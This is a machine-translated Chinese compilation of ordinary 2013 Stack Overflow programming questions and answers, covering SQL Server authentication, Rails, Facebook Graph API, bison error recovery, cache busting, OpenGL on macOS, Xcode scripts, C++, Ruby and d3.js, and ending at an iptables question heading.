$sqlCommand.ExecuteNonQuery()
$sqlConnection.close() 
```

我预计此更新会失败，因为我没有在连接字符串中指定集成安全性。但是，当我以“TestIDRestricted”身份重新登录 Microsoft SQL Server Management Studio 并再次运行以下查询时

```
select MyField
from MyTable
where ID = 2 
```

我看到它返回“5”。因此，即使我预计它会失败，更新也成功了。据我所知，它成功的原因是因为 SQL 权限基于我的 ID，使用集成安全性，而不是与我在连接字符串中使用的 ID 关联的安全性。

如何让脚本使用与我在连接字符串中指定的 ID 关联的权限，而不是使用我的 ID 的权限，这些权限似乎遵循集成安全性？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-10T20:50:05.750

您将 Trusted_Connection 设置为 TRUE；这几乎可以肯定意味着您正在使用当前用户的凭据进行连接，而不是连接字符串中指定的凭据。尝试：

```
$ConnectionString = "Server=MyServer\MSSQL2012;Database=mydb;User Id= TestIDRestricted;Password=secretpasswd;"
$ConnectionString = $ConnectionString + "Trusted_Connection = no;Persist Security Info=False" 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-10T20:55:13.527

您可能只需注释掉第二行：

```
$ConnectionString = "Server=MyServer\MSSQL2012;Database=mydb;User Id= TestIDRestricted;Password=secretpasswd;"
' $ConnectionString = $ConnectionString + "Trusted_Connection = yes;Persist Security Info=False" 
```

（这是VB吗？）

# ruby-on-rails - 更改 ActiveModel 对象的 respond_to url

> ID：15936035
> 
> 赞同：0
> 
> 时间：2013-04-10T20:46:19.910
> 
> 标签：ruby-on-rails, routing, activemodel, ruby-on-rails-4

**摘要**：

如何自定义`respond_to`为 ActiveModel 对象生成的路径？

*更新*：我正在寻找一个钩子、方法覆盖或配置更改来完成此操作，而不是解决方法。（解决方法很简单，但并不优雅。）

**上下文和示例**：

这里有一个例子来说明。我有一个模型，`Contract`它有很多字段：

```
class Contract < ActiveRecord::Base
  # cumbersome, too much for a UI form
end 
```

为了使 UI 代码更易于使用，我有一个更简单的类`SimpleContract`：

```
class SimpleContract
  include ActiveModel::Model

  # ...

  def contract_attributes
    # convert SimpleContract attributes to Contract attributes
  end

  def save
    Contract.new(contract_attributes).save
  end
end 
```

这很好用，但我的控制器有问题......

```
class ContractsController < ApplicationController
  # ...

  def create
    @contract = SimpleContract.new(contract_params)
    flash[:notice] = "Created Contract." if @contract.save
    respond_with(@contract)
  end

  # ...
end 
```

问题是`respond_with`指向`simple_contract_url`，**但**我希望它指向`contract_url`。最好的方法是什么？（请注意，我使用的是 ActiveModel。）

（注意：我使用的是 Rails 4 Beta，但这不是我的问题的核心。我认为 Rails 3 的一个好的答案也可以。）

边栏：如果这种将模型包装在轻量级 ActiveModel 类中的方法对您来说不明智，请在评论中告诉我。就个人而言，我喜欢它，因为它使我的原始模型保持简单。“包装器”模型处理一些 UI 细节，这些细节被有意简化并提供合理的默认值。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-10T22:09:59.177

首先，这是一个有效的答案：

```
class SimpleContract
  include ActiveModel::Model

  def self.model_name
    ActiveModel::Name.new(self, nil, "Contract")
  end
end 
```

[我根据kinopyo](https://stackoverflow.com/a/12330756/109618)对[Change input name of model](https://stackoverflow.com/questions/12313291)的回答改编了这个答案。

现在，为什么。的调用堆栈`respond_to`有些涉及。

```
# Start with `respond_with` in `ActionController`. Here is part of it:

def respond_with(*resources, &block)
  # ...
  (options.delete(:responder) || self.class.responder).call(self, resources, options)
end

# That takes us to `call` in `ActionController:Responder`:

def self.call(*args)
  new(*args).respond
end

# Now, to `respond` (still in `ActionController:Responder`):

def respond
  method = "to_#{format}"
  respond_to?(method) ? send(method) : to_format
end

# Then to `to_html` (still in `ActionController:Responder`):

def to_html
  default_render
rescue ActionView::MissingTemplate => e
  navigation_behavior(e)
end

# Then to `default_render`:

def default_render
  if @default_response
    @default_response.call(options)
  else
    controller.default_render(options)
  end
end 
```

这就是我目前所得到的。我实际上还没有找到构建 URL 的位置。我知道它是基于 发生的`model_name`，但我还没有找到它发生的代码行。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-10T20:52:18.207

我不确定我是否完全理解你的问题，但你能做这样的事情吗？

```
class SimpleContract
  include ActiveModel::Model
  attr_accessor :contract

  # ...

  def contract_attributes
    # convert SimpleContract attributes to Contract attributes
  end

  def save
    self.contract = Contract.new(contract_attributes)
    contract.save
  end
end 
```

-

```
class ContractsController < ApplicationController
  # ...

  def create
    @simple_contract = SimpleContract.new(contract_params)
    flash[:notice] = "Created Contract." if @simple_contract.save
    respond_with(@simple_contract.contract)
  end

  # ...
end 
```

我可能离基地很远。希望这至少会为您触发一个想法。

# facebook - Facebook 图形 API 搜索 https://graph.facebook.com/search?q=query&type=user 有两个关键字

> ID：15936038
> 
> 赞同：9
> 
> 时间：2013-04-10T20:46:24.387
> 
> 标签：facebook, facebook-graph-api, sdk

如果我执行 Facebook 图形 api 搜索，例如：

```
https://graph.facebook.com/search?q=query&type=user 
```

如果查询只是一个单词，例如 'Mark' ，一切都很好并且有结果。但是，如果查询是两个单词，例如 'Mark Roberts' ，则不会返回任何结果。

我尝试过使用“Mark+Roberts”，也尝试过使用带有转义的 URL 编码，但这无济于事。但是，当我使用两个关键字并删除 &type=user 时，我得到了结果（尽管有大量随机的 facebook 内容）。

所以：

```
https://graph.facebook.com/search?q=mark&type=user   < WORKS

https://graph.facebook.com/search?q=mark+robers&type=user   < DOES NOT WORK

https://graph.facebook.com/search?q=mark+robers  < WORKS (but does not return people) 
```

有没有人遇到过这个问题？

Facebook 似乎没有提到任何关于此的内容：http: [//developers.facebook.com/docs/reference/api/search/](http://developers.facebook.com/docs/reference/api/search/)

注意：我当然使用经过身份验证的 APP ID 和登录用户等来执行此操作。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-04-11T06:35:37.373

我使用网络浏览器进行了测试，它按预期工作。

![在此处输入图像描述](https://i.stack.imgur.com/w3FpP.png)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2018-08-13T13:20:21.197

现在不推荐根据“type=user”进行搜索。见[https://developers.facebook.com/docs/graph-api/changelog/break-changes#search-4-4](https://developers.facebook.com/docs/graph-api/changelog/breaking-changes#search-4-4)

# java - 谷歌应用引擎 cron.xml 解析失败

> ID：15936039
> 
> 赞同：0
> 
> 时间：2013-04-10T20:46:27.083
> 
> 标签：java, google-app-engine, cron

我有以下 cron.xml：

```
<?xml version="1.0" encoding="UTF-8"?>
<cronentries>
  <cron>
    <url>/_ah/admin/cronjob?job=aaa</url>
    <description>aaa cronjob</description>
    <schedule>every 60 minutes</schedule>
  </cron>
  <cron>
    <url>/_ah/admin/cronjob?job=bbb</url>
    <description>bbb cronjob</description>
    <schedule>every 250 hours</schedule>
  </cron>
 </cronentries> 
```

部署到谷歌应用引擎时，它说

> com.google.apphosting.utils.config.AppEngineConfigException：每 250 小时安排一次未能解析

它适用于 24 和 96 小时，但不适用于 200、240 和 192。是否有没有写在文档中的上限？

# ipython - IPython中的自动关闭括号和引号

> ID：15936042
> 
> 赞同：1
> 
> 时间：2013-04-10T20:46:34.483
> 
> 标签：ipython, ipython-notebook

有没有办法在 IPython 中自动关闭括号和引号。就像在 RStudio 中，当您键入像 [ 之类的左括号时，它会自动键入右括号 ] 并将光标移动到括号内。与引号相同。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-10T21:12:03.967

可能的，可能不是太难，但不是微不足道的。可能需要更新底层库（正在进行中），并在 CodeMirror 文档中挖掘以查看是否已经有这样的选项。如果您有兴趣深入研究代码/提交补丁，我建议您在 ML / github 上询问方向。

# mercurial - Mercurial Merge 完全采用本地/忽略远程

> ID：15936043
> 
> 赞同：0
> 
> 时间：2013-04-10T20:46:34.687
> 
> 标签：mercurial, merge

我想知道这是否可能。

假设我有以下变更集

```
Changeset 5: Did Something to file c.txt
Changeset 4: Added some change to File b.txt
Changeset 3: Added some change to File a.txt
Changeset 2: Did Something to file c.txt
Changeset 1: Did Something to file c.txt 
```

我意识到从变更集 3 到 5，我搞砸了，我想回到变更集 2 [轻松完成更新]。

现在我从变更集 2 开始工作，并制作变更集 6，它具有变更集 2 的父项。

如果我将变更集 2 合并到变更集 5 中，对文件 b.txt 和文件 a.txt 的更改将显示在合并的头中。有没有办法让变更集 6 成为我的新负责人？

几个限制。我不想开始一个新的分支，并且我无法剥离更改，因为它们已经被推送到服务器。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-10T22:03:15.667

*   在变更集 7 中撤销 3 和 4
*   合并 6 和 7

# bison - 如何在 yacc/bison 中找到用于错误报告的不平衡分隔符？

> ID：15936049
> 
> 赞同：3
> 
> 时间：2013-04-10T20:46:50.813
> 
> 标签：bison, yacc

我有一个使用括号和方括号作为分隔符的语法。当给野牛生成的解析器输入带有不平衡分隔符的输入时，`YYLTYPE*`传递到的错误位置`yyerror`是输入的结尾。因此，例如，在 input`xx(yy`中，`void yyerror(YYLTYPE* yylloc, Context* ctx, const char* msg)`我有 that `yylloc->first_column == yylloc->last_column == 5`。不幸的是，输入的结尾并不是指示不匹配分隔符的最显着位置。更有用的是不匹配的左括号或左方括号的位置。（在示例中，这将是偏移量 2 处的左括号。）我认为此信息在解析堆栈中可用 --- 必须有一些*n*是`$-n`不匹配的`(`或`[`令牌，并且`@-n`是`YYLTYPE`保持其位置的结构——但似乎没有一个可以从`yyerror`. 我知道我可以保留自己的堆栈来跟踪定界符的偏移量并存储在`Context`I 已经传递到 中`yyerror`，但这似乎不雅和重复，因为野牛已经在跟踪这个。

那么：如何从野牛中获得它在输入中遇到的第一个不平衡分隔符的位置，以便在生成解析错误消息时可用？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-04-13T20:27:48.303

您应该能够添加以下任一规则：

```
atom: '(' error    { /* unmatched left paren at @1 */ } 
```

或者

```
atom: '(' alt error    { /* unmatched left paren at @1 */ } 
```

获取有关不匹配的左括号的信息。不同之处在于第一个规则将匹配一个不匹配的括号，该括号后面没有任何可解析的内容（例如在输入的末尾），而第二个规则只有在它后面跟着一个看起来像有效的东西时才会匹配`alt`。

如果您的语法中有任何其他错误产生（在链接语法中没有），则可能存在问题，在这种情况下，可能会首先触发不同的错误产生。由于没有其他错误规则，第一种选择更好。

请注意，使用 yacc/bison 错误恢复规则不会以任何方式抑制语法错误，它只是在语法错误之后运行一些代码以尝试恢复。该代码可以打印额外的错误消息然后中止而不是尝试恢复，但是这些消息将在语法错误消息之后打印。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-11T19:25:54.367

查看野牛中的错误标记：[http ://www.gnu.org/software/bison/manual/html_node/Error-Recovery.html#Error-Recovery](http://www.gnu.org/software/bison/manual/html_node/Error-Recovery.html#Error-Recovery)

我想这样的事情会起作用（我没有测试过）：

```
atom:  '(' alt ')'        { $$ = $2; }
    |  '(' alt error '\n' { /* this handles an extra left paren */ }
    |   error alt ')'     { /* this handles an extra right paren */ }
    |   literal
    ; 
```

# javascript - 强制浏览器在站点更新后重新加载所有缓存

> ID：15936050
> 
> 赞同：12
> 
> 时间：2013-04-10T20:46:56.307
> 
> 标签：javascript, web-applications, deployment, glassfish-3, cache-control

在服务器被推送到代码库的更新后，有没有办法强制网页的客户端重新加载缓存（即图像、javascript 等）？我们接到很多帮助台电话，询问为什么某些功能不再起作用。一个简单的硬刷新解决了下载新更新的 javascript 文件时的问题。

具体来说，我们使用的是 Glassfish 3.x。和 JSF 2.1.x。当然，这不仅仅适用于 JSF。

描述我希望可能的行为：

网站 A 有两个图像和两个 javascript 文件。用户访问该站点，这 4 个文件被缓存。就我而言，除非用户明确强制“硬”刷新或清除缓存，否则无需“重新下载”所述文件。一旦站点被推送到其中一个文件的更新，服务器可能会在标头中包含某种元数据，通知客户端所述更新。如果客户端选择，将下载新文件。

我不想做的是将元标记放在页面的标题中以强制缓存任何内容......我只想要告诉客户端发生更新的东西，一旦有东西它应该得到最新的已更新。我想这只是客户端的某种版本控制。

谢谢你的时间！

* * *

## 回答 #1

> 赞同：15
> 
> 时间：2013-04-10T21:09:05.500

处理此问题的正确方法是更改​​资源的 URL 约定。例如，我们有它：

```
/resources/js/fileName.js 
```

要让浏览器仍然缓存文件，但要以正确的方式进行版本控制，就是在 URL 中添加一些内容。向查询字符串添加值不允许缓存，因此放置它的位置在`/resources/`.

查询字符串缓存的参考：http: [//www.w3.org/Protocols/rfc2616/rfc2616-sec13.html#sec13.9](http://www.w3.org/Protocols/rfc2616/rfc2616-sec13.html#sec13.9)

例如，您的 URL 如下所示：

```
/resources/1234/js/fileName.js 
```

因此，您可以做的是使用项目的版本号（或属性/配置文件中的某个值，当您希望重新加载缓存文件时手动更改），因为此数字仅在修改项目时才*应更改。*因此，您的 URL 可能如下所示：

```
/resources/cacheholder${project.version}/js/fileName.js 
```

这应该很容易。

现在的问题是映射 URL，因为中间的值是动态的。我们克服这个问题的方法是使用 URL 重写模块，该模块允许我们在 URL 到达我们的应用程序之前对其进行过滤。重写监视看起来像这样的 URL：

```
/resources/cacheholder______/whatever 
```

并删除了`cacheholder_______/`部分。重写后，它看起来像一个正常的请求，服务器会以正确的文件响应，没有任何其他特定的映射/逻辑......关键是浏览器认为它是一个新文件（即使它真的不是t)，所以它请求了它，服务器计算出来并提供正确的文件（即使它是一个“奇怪的”URL）。

当然，另一种选择是将这个动态字符串添加到文件名本身，然后使用重写工具将其删除。无论哪种方式，都做了同样的事情——在重写期间定位一串文本，然后将其删除。这使您可以欺骗浏览器，但不能欺骗服务器:)

* * *

**更新：**

我真正喜欢的另一种方法是根据内容设置文件名，然后缓存它。例如，这可以通过哈希来完成。当然，这种类型的事情不是您手动执行并保存到您的项目（希望如此）的事情；这是您的应用程序/框架应该处理的事情。例如，在 Grails 中，有一个“散列和缓存”资源的插件，因此会发生以下情况：

*   检查每个资源
*   创建一个新文件（或到该文件的映射），其名称是其内容的哈希值
*   将`<script>`/`<link>`标签添加到您的页面时，将使用散列名称
*   当请求哈希命名的文件时，它服务于原始资源
*   以哈希命名的文件被“永远”缓存

这种设置的好处在于您不必担心是否正确缓存 - 只需将文件设置为永久缓存，并且散列应该根据内容处理可用的文件/映射。它还提供了回滚/撤消已经被缓存和快速加载的能力。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-10T20:51:28.410

我在这种情况下使用 no-cache 参数...有一个字符串常量值，例如（来自配置文件）

```
$no_cache = "v11"; 
```

在页面中，我使用资产，例如

```
<img src="a.jpg?nc=$no_cache"> 
```

当我更新我的代码时，只需更改 $no_cache 值，它就像一个魅力。

# math - 标准单位换算表

> ID：15936055
> 
> 赞同：1
> 
> 时间：2013-04-10T20:47:14.643
> 
> 标签：math, units-of-measurement

我的任务是调查有关单位转换错误（例如米到英尺）的一些问题。标准转换数字是否有明确的来源？我希望转换因子尽可能精确。

我知道有许多网站提供了大量的转换，但我正在寻找的是一个标准，无论是官方的还是事实上的用作基准。

具有 32 位和 64 位数字的表将是完美的。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-11T10:27:48.850

[GNU Units](http://www.gnu.org/software/units/units.html)的[单元定义文件](http://fossies.org/linux/misc/units-2.01.tar.gz%3aa/units-2.01/definitions.units)列出了大量的来源：

> 大多数单位数据来自
> 
> 1.  NIST 特别出版物 811，国际单位制 (SI) 使用指南。巴里·N·泰勒。1995
> 2.  CRC化学和物理手册第70版
> 3.  牛津英语词典
> 4.  韦氏新通用未删节词典
> 5.  Stephen Dresner 的计量单位
> 6.  罗纳德·祖普科 (Ronald Zupko) 的英语度量衡词典
> 7.  罗纳德·祖普科的英国度量衡
> 8.  艾萨克·阿西莫夫的度量领域
> 9.  美国度量衡标准，由 Arthur H. Frazier 创建和创建者。
> 10.  革命前的法国度量衡：罗纳德·祖普科（Ronald Zupko）的省级和地方单位词典
> 11.  度量衡：它们的古老起源和直到公元 1855 年在英国的发展，FG Skinner
> 12.  H. Arthur Klein 的测量世界
> 13.  威廉·约翰斯通（William Johnstone）的良好衡量标准
> 14.  NTC 的国际度量衡百科全书威廉·约翰斯通（William Johnstone）
> 15.  John Lord 的尺码
> 16.  史蒂芬·施特劳斯 (Stephen Strauss) 的 Sizesaurus
> 17.  [可在http://physics.nist.gov/cuu/Constants/index.html](http://physics.nist.gov/cuu/Constants/index.html)获得 CODATA 推荐的物理常数值
> 18.  多少？计量单位词典。可在 [http://www.unc.edu/~rowlett/units/index.html获得](http://www.unc.edu/~rowlett/units/index.html)
> 19.  数字。 [http://www.numericana.com](http://www.numericana.com)
> 20.  英国测量史 [http://www.ukmetrication.com/history.htm](http://www.ukmetrication.com/history.htm)
> 21.  NIST 手册 44，称重和测量设备的规格、公差和其他技术要求。2011
> 22.  NIST 特别出版物 447，美国计量标准：简史。刘易斯诉贾德森。1963；转。1976年

对于许多单位，该文件包含官方定义，因此它将尽可能精确。评论经常解释该定义的来源。

# macos - 如何在 Mac OS X 中检测“无效的可绘制对象”？

> ID：15936059
> 
> 赞同：4
> 
> 时间：2013-04-10T20:47:23.813
> 
> 标签：macos, opengl, ati

我正在开发一个已有十多年历史的跨平台应用程序。UI 由 Qt 完成，后端渲染由 OpenGL 完成。OpenGL 上下文在后端管理，而不是由 Qt。

我最近为我们的应用程序中的所有 OpenGL 代码添加了错误检查和报告。偶尔会出现这样一种情况，即由 Qt 启动的第一次渲染会在终端中导致“无效的可绘制”错误消息，并且所有后续的 OpenGl 调用都会失败并报告“无效的帧缓冲区”错误。这些无效的drawable错误消息在过去被视为无害的，因为在用户看到它之前，drawable最终变得有效并且场景被正确渲染。但是，使用新的 OpenGL 错误检查/报告是不可能的，因为报告了大量错误。

我想测试drawable是否有效。如果不是，它应该在渲染开始之前返回。如何验证可绘制对象是否有效？

MacBook Pro、OS X Mountain Lion (10.8.3)、ati 显卡

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-10T21:24:44.937

我不知道您在哪个 API 级别工作。我不确定是否有可能在事后发现问题。也就是说，如果您所拥有的只是一个无法连接到其可绘制对象的上下文（可能隐含为线程的当前上下文）。

我认为 Qt 在后台使用 Cocoa。我进一步假设它已经创建`NSOpenGLContext`并正在调用`-setView:`它。如果在调用时视图的窗口没有窗口设备，则会出现“无效的可绘制”错误。

一种常见的技术是推迟设置上下文的视图，直到视图`-drawRect:`调用它，因为此时您确定视图有一个窗口并且窗口有一个设备。（尽管这忽略了在正常窗口显示机制之外强制绘制的可能性。例如，`-cacheDisplayInRect:toBitmapImageRep:`。）

如果您只想在调用时`-setView:`知道它是否安全，我*认为*您可以依靠检查`[[view window] windowNumber]`. 文档`-windowNumber`说：

> 如果窗口没有窗口设备，则返回的值将等于或小于 0。

另一种方法是防止问题而不是检测问题。这样做的策略基本上是确保在调用`-setView:`. 您可以通过在屏幕上订购并调用`-display`它来强制执行此操作。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-11-01T20:37:15.310

Ken Thomases 的帖子为我提供了找到可行解决方案所需的基本信息。需要一个额外的条件。这是有效的

```
//----------------------------------------------------------------------------
bool vtkCocoaRenderWindow::IsDrawable()                                                                                                                                                                                                                                                                                                                   
{
  // you must initialize it first
  // else it always evaluates false
  this->Initialize();

  // first check that window is valid
  NSView *theView = (NSView*)this->GetWindowId();
  bool win =[[theView window] windowNumber]>0;

  // then check that the drawable is valid
  NSOpenGLContext *context = (NSOpenGLContext *)this->GetContextId();
  bool ok  = [context view] != nil; 
  return win && ok;
} 
```

# matlab - 通过终端运行 MATLAB 时语法突出显示？

> ID：15936061
> 
> 赞同：1
> 
> 时间：2013-04-10T20:47:26.797
> 
> 标签：matlab, syntax

我真的不喜欢 MATLAB GUI，因此，我按照在线说明通过终端使用`matlab -nodesktop`. 有用。但是，我缺乏语法高亮的便利；例如，vim 中存在的那种。

我有兴趣知道这是否可能。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-10T20:52:25.340

试试这个 FileExchange 提交：

*   [在 Vim 中突出显示 Matlab 文件](http://www.mathworks.com/matlabcentral/fileexchange/28240)
*   [在 Vim 中编辑 Matlab 文件](http://www.mathworks.com/matlabcentral/fileexchange/21798-editing-matlab-files-in-vim)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-10T20:57:03.957

emacs有[Matlab 模式](http://www.emacswiki.org/MatlabMode)，还有一个用于语法高亮的内置 octave 模式。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-04-10T20:53:21.470

您可以`edit yourfile.m`在终端中使用来打开 matlab 编辑器。这将打开没有整个 matlab gui 的编辑器。不知道你为什么要这样做......

# xcode - 无法让 shell 脚本在 Xcode 中运行

> ID：15936062
> 
> 赞同：4
> 
> 时间：2013-04-10T20:47:31.173
> 
> 标签：xcode, shell

我对在 Xcode 中运行脚本相当陌生，并且无法弄清楚我正在运行的脚本有什么问题。我运行的第一个脚本是这样的：

```
/bin/sh -x

PBXCP=${DEVELOPER_DIR}/Library/PrivateFrameworks/DevToolsCore.framework/Resources/pbxcp
${PBXCP} -exclude .svn "${PROJECT_DIR}/../../base" 
"${BUILT_PRODUCTS_DIR}/${UNLOCALIZED_RESOURCES_FOLDER_PATH}/" 
```

这导致我遇到了这个错误：

```
/Users/newperson/Library/Developer/Xcode/DerivedData/appname-etesgjzdmfzimlgvakidckjecgij
/Build
/Intermediates/appname.build/Debug-iphonesimulator/app.build/Script-
435F41A90F532CA300887552.sh: line 3: /Applications/Xcode.app/Contents/Developer/Library
/PrivateFrameworks/DevToolsCore.framework/Resources/pbxcp: No such file or directory 
```

这个错误很中肯，脚本正在寻找的文件不存在。较新版本的 Xcode 已经摆脱了 pbxcp。因此，当我发现这个时，我开始寻找一个不使用 pbxcp 的好的替代脚本来运行：

```
/bin/sh -x

/usr/bin/tar -c -C "${PROJECT_DIR}/myframeworks" --exclude .DS_Store --exclude CVS --exclude
.svn --exclude .git -H `cd "${PROJECT_DIR}/myframeworks" && find DevToolsCore.framework` | 
/usr/bin/tar -x -C ${BUILT_PRODUCTS_DIR}/${FRAMEWORKS_FOLDER_PATH} 
```

这个脚本也让我遇到了一个问题，那就是：

```
tar: could not chdir to '/Users/newperson/Library/Developer/Xcode/DerivedData/appname-
etesgjzdmfzimlgvakidckjecgij/Build/Products/Debug-iphonesimulator/appname.app/Frameworks'

tar: Write error
Command /bin/sh failed with exit code 1 
```

我找不到这个错误意味着什么的明确答案，一个论坛建议我在我的脚本中使用 sudo 命令来授予脚本更改目录的权限，所以我运行了这个：

```
/bin/sh -x

/usr/bin/tar -c -C "${PROJECT_DIR}/myframeworks" --exclude .DS_Store --exclude CVS --exclude
.svn --exclude .git -H `cd "${PROJECT_DIR}/myframeworks" && find DevToolsCore.framework`
| sudo /usr/bin/tar -x -C ${BUILT_PRODUCTS_DIR}/${FRAMEWORKS_FOLDER_PATH} 
```

这个脚本让我遇到了这个错误：

```
tar: Write error
Command /bin/sh failed with exit code 1
++ find DevToolsCore.framework
sudo: no tty present and no askpass program specified
tar: Write error 
```

到目前为止，我对 shell 脚本的知识有限，所以我很迷茫，所以任何帮助纠正我的脚本或找到包含 pbxcp 的 Xcode 框架的合适替代品都将不胜感激。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-06-18T14:04:18.217

更改脚本要写入文件的目录的权限。在终端的交互式会话中执行此操作：

```
 $ sudo chmod a+w the_directory 
```

然后你应该能够运行你的脚本（没有`sudo`ing `tar`）。

# c++ - 如何从非空函数返回？

> ID：15936065
> 
> 赞同：1
> 
> 时间：2013-04-10T20:47:49.297
> 
> 标签：c++, pointers, reference, warnings, void

我在下面有一个函数，可以搜索`my_type`. 目前，它有一个编译警告：`control reaches end of non-void function [-Wreturn-type]`. 看来，只要我使用引用作为返回类型而不是指针，就不可能返回类似 null 的值？

```
struct my_type{
    type_a a;
    type_b b;
}

    type_b& value(type_a& t){
        typename std::vector<my_type>::iterator it;  
        for(it = v.begin(); it != v.end(); ++it){
            if ((*it).a == t) return (*it).b;
            }
    } 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-10T20:49:57.073

> 看来，只要我使用引用作为返回类型而不是指针，就不可能返回类似 null 的值？

嗯，是的，但这不是唯一的问题。引用永远不可能`null`，但是如果您的`if`语句从不计算结果会`true`怎样？你不返回*任何东西*。

由于引用不能为空，因此返回无效`null`。您必须从所有执行路径返回有效引用。

此外，您的代码充其量是脆弱的。您正在返回对容器中元素成员的引用......该元素可能会在将来的任何时候移动，从而使所述引用无效。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-10T22:04:25.020

您必须考虑的问题是，如果在您的函数必须返回时发现“无”，您应该返回什么`my_type`。你如何处理这个直接影响调用者如何使用这个函数和做出的假设。

您可以考虑一些想法。例如，如果你的`value`函数返回一个指针类型，你可以只返回`NULL`来表示什么都没有。如果它返回一个字符串，您可以使用一个空字符串`""`，甚至可以使用一个特殊的字符串值`"none"`来表示这一点。因为`type_b`您可以创建它的一个特殊实例，然后只返回该实例来表示什么。调用 this 的其他函数将`type_b`根据该实例检查返回的值以查看它是否为空。关键是，有很多方法可以解决，您选择哪种方式取决于您。

但更好的方法是使用 stl 已经提供的内容——尤其是`std::find_if`. 例如，您可以创建一个指定何时匹配的函子：

```
struct find_b
{
  const type_a &this_a;
  find_b(const type_a &a) : this_a(a) {}
  bool operator() (const my_type &lhs)
  {
    return lhs.a == this_a;
  }
}; 
```

然后你会像这样使用它：

```
item = std::find_if(v.begin(), v.end(), find_b(t));
if(item == v.end()) { /* not found */ }
else { /* found, do something useful here */ } 
```

# ruby - 比较字符串时出错？

> ID：15936066
> 
> 赞同：0
> 
> 时间：2013-04-10T20:47:49.563
> 
> 标签：ruby, string

当我运行以下代码时，str 是字符串类型：

```
def self.split(str)
    array = Array.new
    for i in 0..str.length-1
      if str[i].casecmp('a') == 0 || str[i].casecmp(':') == 0
       ...
      end
    end

    array
  end

if __FILE__ == $PROGRAM_NAME
    count = 0;
    File.readlines('C:/Users/JRQuick/Desktop/while1.test').each do |line|
      line = line.strip()
      count = count + 1

      #CHECKS IF LINE IS COMMENT
      if (line.include? '//').equal? false
        #CHECKS IF EMPTY LINE
        if (line.gsub(" ", "").length != 0)
          array = split(line)
          print array
        end
      end
    end
  end
end 
```

出现此错误：

```
`block in split': undefined method `[]' for nil:NilClass (NoMethodError) 
```

我们在上面第 4 行抛出的错误，即 split() 中的 if 语句。

我尝试过 equals() 和 matches() 进行字符串比较，但它们抛出了相同的错误。我也尝试过 eql?() ，它不会引发错误但不能正确比较字符串，总是返回 false，即使应该返回 true。

除了上述内容外，我还确保 str[i] 永远不会为零，甚至尝试过`str[i].to_s`

# javascript - 当我调用 d3.behavior.zoom 我的图形 range.domain() 变为空

> ID：15936068
> 
> 赞同：1
> 
> 时间：2013-04-10T20:47:54.390
> 
> 标签：javascript, d3.js

我有 1 个带有相同 X 比例（时间）的曲线的**图表**

```
ths.xRange = d3.time.scale().range([0, ths._innerWidth()]);
ths.xAxis = d3.svg.axis().scale(ths.xRange).orient("bottom");
ths.curves = []; 
```

每条**曲线**都是**图的孩子**

```
function curve(parent, init) {
    var ths = this;
    ths.parent = parent;
    ths.yRange = d3.scale.linear().range([ths.parent._innerHeight(), 0]);
    ths.xDomain = ths.parent.xRange.domain(d3.extent(ths.data.initial.map(function(d) { return d.date; })));
    ths.yDomain = ths.yRange.domain(d3.extent(ths.data.initial.map(function(d) { return d.val; })));
    // line generator
    ths.line = d3.svg.line()
        .interpolate("linear")
        .x(function(d) { return ths.xDomain(d.date); })
        .y(function(d) { return ths.yDomain(d.val); }); 
```

但是当我使用缩放时：

```
 ths._Sensitive.call(
            ths.CurrentZoom = d3.behavior.zoom()
            .x(ths.xRange)
            .scaleExtent([1,1000])
            .on("zoom", function() {
                window.clearTimeout(ths.timeoutID);
                ths.timeoutID = window.setTimeout(function() {
                    console.log('event <Improove granularity>');
                },
                400); // Delay (in ms) before request new data
                ths.zoom ();
            }
        )
    );
    ths.zoom = function(){
        console.log ('ths.xRange.domain()=', ths.xRange.domain());
        // trace l'axe X
        ths.svg().select("#xAxis").call(ths.xAxis);
    } 
```

在 Zoom 域很好之前，我在 domain() 上有问题

```
graph.xRange.domain()
[Tue Jan 01 2013 00:32:00 GMT+0100 (CET), Wed Apr 10 2013 21:00:00 GMT+0200 (CEST)] 
```

但是缩放后我的域（）是错误的！

```
graph.xRange.domain()
[Thu Jan 01 1970 01:00:00 GMT+0100 (CET), Thu Jan 01 1970 01:00:00 GMT+0100 (CET)] 
```

我不明白这种行为。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-16T06:10:46.120

在`curve()`您覆盖的功能`ths`中。因此，在调用 时`zoom()`，`ths`used 不再具有`xAxis`值，这意味着您调用`undefined`具有`ths.svg().select("#xAxis")`将轴的域设置为的结果，`empty`因为它必须是一个数组。

覆盖的目标`this`是能够在子函数中使用它，因此您不应该在子函数中覆盖它。

顺便一提。你应该使用`ths.svg.select("#xAxis")`而不是`ths.svg().select("#xAxis")`因为我不明白为什么`svg`代表 svg 元素的变量应该是一个变量。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2014-03-26T08:46:03.647

关于时间尺度，如果您在未设置时间尺度域时定义缩放，则会观察到无效时间行为。在时间刻度上设置域后，您可以通过在缩放上设置时间刻度来掩盖这一点。

```
var xScale = d3.time.scale()
               .range([0,width]);

var zoom = d3.behavior.zoom()
             .on("zoom", function(){
                 console.log("zoomed", d3.event.scale);
             });

xScale.domain([new Date('2014-03-15'), new Date('2014-03-30')]);

zoom.x(xScale); 
```

# linux - 允许使用 iptables 进行重定向

> ID：15936069
> 
> 赞同：-1
> 
> 时间：2013-04-10T20:47:55.533
> 
> 标签：linux, security, ubuntu, iptables

